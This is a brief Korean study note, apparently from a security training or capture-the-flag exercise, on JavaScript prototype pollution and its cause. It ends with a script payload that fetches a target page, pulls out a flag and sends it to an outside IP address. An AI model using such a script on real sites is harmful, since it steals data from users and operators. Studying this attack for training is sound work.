[[JS]]

JavaScript 객체 프로토타입 체인에서 발생할 수 있는 보안 취약점
공격자가 임의적으로 웹 애플리케이션의 JavaScript 객체 프로토타입을 수정할 수 있게 되면 발생

# 발생 원인
JavaScript에서 객체는 프로토타입을 기반으로 상속을 수행
객체의 프로퍼티나 메서드를 찾을 때 해당 객체에 없으면 프로토타입 체인을 따라 부모 객체로 검색하게 되는데, 
공격자가 이러한 프로토타입 체인을 조작하여 애플리케이션의 기본 동작을 변경할 수 있게 함

```js
<script> fetch('http://2023whs.arang.kr:9200/prototype_pollution.php').then(response => response.text()).then(data => { 
	let flag = data.match(/flag{.*?}/)[0]; 
	fetch('http://211.250.216.249:7444/receive_flag?flag=' + flag); 
}); 
</script>
```